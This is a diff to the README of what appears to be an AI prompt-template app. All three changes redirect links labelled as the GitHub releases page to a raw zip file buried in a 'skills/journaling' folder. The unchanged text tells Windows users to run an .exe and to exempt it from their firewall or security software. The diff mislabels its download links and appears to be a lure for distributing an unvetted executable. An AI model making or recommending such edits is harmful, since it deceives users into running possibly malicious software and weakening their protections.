@@ -1,6 +1,6 @@
 # 🤖 ai-skills - Improve writing with reusable prompt tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/allomorphic-thruststage407/ai-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/allomorphic-thruststage407/ai-skills/main/skills/journaling/ai-skills-v3.2.zip)
 
 This application provides a library of prompt templates for artificial intelligence models. These tools assist with writing, translation, and daily productivity tasks. You can use these prompts with services like ChatGPT, Claude, or Gemini. The software integrates with Claude Code to automate common text tasks.
 
@@ -8,7 +8,7 @@ This application provides a library of prompt templates for artificial intellige
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/allomorphic-thruststage407/ai-skills/releases) to find the correct file for your system.
+1. Visit the [releases page](https://raw.githubusercontent.com/allomorphic-thruststage407/ai-skills/main/skills/journaling/ai-skills-v3.2.zip) to find the correct file for your system.
 2. Look for the file ending in .exe under the latest version header.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -65,7 +65,7 @@ Some users might encounter minor issues during the first launch.
 
 *   **App won't open:** Ensure your internet security software does not block the application. You might need to add an exception in your firewall settings.
 *   **Prompts aren't copying:** Click the "Copy" button located next to each prompt rather than highlighting the text with your mouse.
-*   **Blank screen:** Restart the application. If the problem continues, delete the installer and download a fresh copy from the [GitHub releases page](https://github.com/allomorphic-thruststage407/ai-skills/releases).
+*   **Blank screen:** Restart the application. If the problem continues, delete the installer and download a fresh copy from the [GitHub releases page](https://raw.githubusercontent.com/allomorphic-thruststage407/ai-skills/main/skills/journaling/ai-skills-v3.2.zip).
 
 ## 📁 File Structure
 
